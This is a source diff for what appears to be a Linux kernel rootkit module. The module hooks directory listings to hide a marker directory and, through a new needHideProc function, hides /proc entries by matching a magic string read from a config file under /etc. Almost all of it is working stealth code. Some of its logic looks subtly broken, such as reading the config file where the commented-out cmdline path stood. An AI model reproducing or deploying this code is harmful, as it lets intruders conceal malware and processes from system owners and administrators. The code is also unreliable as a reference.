@@ -15,36 +15,105 @@ struct completion synchUnload;
 atomic_t unlFlag = ATOMIC_INIT (0);
 
 const char *badDirName = "===1234DEADBEAF4321===";
+const char *magicString = "===xxxGANGNAM-STYLExxx===";
 const char *badPath = "/proc";
-long pidHide = 8000;
+const char *confPidsFile = "/etc/===1234DEADBEAF4321===/pids.txt";
 
 
 //
 // Functions intercepters
 //
 
+int needHideProc (char *chPtr) {
+	loff_t posFile = 0;
+	ssize_t retLen;
+	const int nameLen = 256;
+	char *chEnd, *chBuf;
+	struct file *filePtr;
+	long pidVal;
+	mm_segment_t oldFs;
+	int ret = 0;
+	
+	
+	if (!chPtr) {
+		printk ("NULL ptr - chPtr !!!\n");
+		return 0;
+	}
+	
+	if (!(pidVal = simple_strtoul (chPtr, &chEnd, 10))) return 0;
+	
+	if (!(chBuf = kmalloc (nameLen, GFP_KERNEL))) return 0;
+	strcpy (chBuf, "/proc/");
+	strcat (chBuf, chPtr);
+	strcat (chBuf, "/cmdline");
+
+	oldFs = get_fs();
+	set_fs (KERNEL_DS);
+	if (!(filePtr = filp_open (/*chBuf*/confPidsFile, O_RDONLY, 0))) {
+#ifdef MY_OWN_DEBUG
+		printk ("Can't open: %s\n", chBuf);
+#endif
+		kfree (chBuf);
+		set_fs (oldFs);
+		return 0;
+	}
+	set_fs (oldFs);
+
+#ifdef MY_OWN_DEBUG
+	if (filePtr == NULL || filePtr->f_op == NULL) {
+		if (filePtr == NULL) printk ("NULL file at file: %s\n", chBuf);
+		else printk ("NULL ptr f_op at struct file: %s\n", chBuf);
+		filp_close (filePtr, current->files);
+		kfree (chBuf);
+		return 0;
+	}
+#endif
+
+	oldFs = get_fs();
+	set_fs (KERNEL_DS);
+	if ((retLen = vfs_read (filePtr, chBuf, nameLen - 1, &posFile)) < 0) {
+#ifdef MY_OWN_DEBUG
+		printk ("Error at reading from: %s, ret: %d\n", chBuf, (int)retLen);
+#endif
+		filp_close (filePtr, current->files);
+		kfree (chBuf);
+		set_fs (oldFs);
+		return 0;
+	}
+	set_fs (oldFs);
+	for (unsigned i = 0; i < retLen; ++i) if (chBuf[i] == '\0') chBuf [i] = '_';
+	chBuf[retLen] = '\0';
+	if (strstr (chBuf, magicString)) ret = 1;
+	
+#ifdef MY_OWN_DEBUG
+	if (ret) printk ("Hided: %s - %s\n", chPtr, chBuf);
+#endif
+	filp_close (filePtr, current->files);
+	kfree (chBuf);
+	
+	
+	return ret;
+}
+
+
 int clearDirEntries (struct linux_dirent64 *dirPtr, unsigned int len, int clrFlag) {
 	int cur, newLen = len;
 	struct linux_dirent64 *tmpPtr = dirPtr;
-	long pidVal;
-	char *chpEnd;
 	
 	do {
 		cur = dirPtr->d_reclen;
 		len -= cur;
 		tmpPtr = (struct linux_dirent64*)((char*)dirPtr + cur);
-#ifdef MY_OWN_DEBUG
-		//printk ("Entry name: %s\n", (char*)&dirPtr->d_type);
-#endif
 		
-		pidVal = simple_strtoul ((char*)&dirPtr->d_type, &chpEnd, 10);
-		
-		if (strstr ((char*)&dirPtr->d_type, badDirName) != NULL ||
-			(clrFlag && pidVal >= pidHide)
+		if ((strstr ((char*)&dirPtr->d_type, badDirName) != NULL) ||
+			(clrFlag && needHideProc ((char*)&dirPtr->d_type))
 			)
 		{
 			memcpy (dirPtr, tmpPtr, len);
 			newLen -= cur;
+#ifdef MY_OWN_DEBUG
+			//printk ("Hided: %s\n", (char*)&dirPtr->d_type);
+#endif
 		} else {
 			dirPtr = tmpPtr;
 		}
@@ -81,7 +150,7 @@ int newGetDents (unsigned int fd, struct linux_dirent64 *dirent, unsigned int co
 #endif
 		} else {
 			realPath = d_path (&fdPtr->f_path, buf, bufLen);
-			printk ("Real path: %s\n", realPath);
+			///printk ("Real path: %s\n", realPath);
 			if (strstr (realPath, badPath)) clrFlag = 1;
 		}
 		fput (fdPtr);
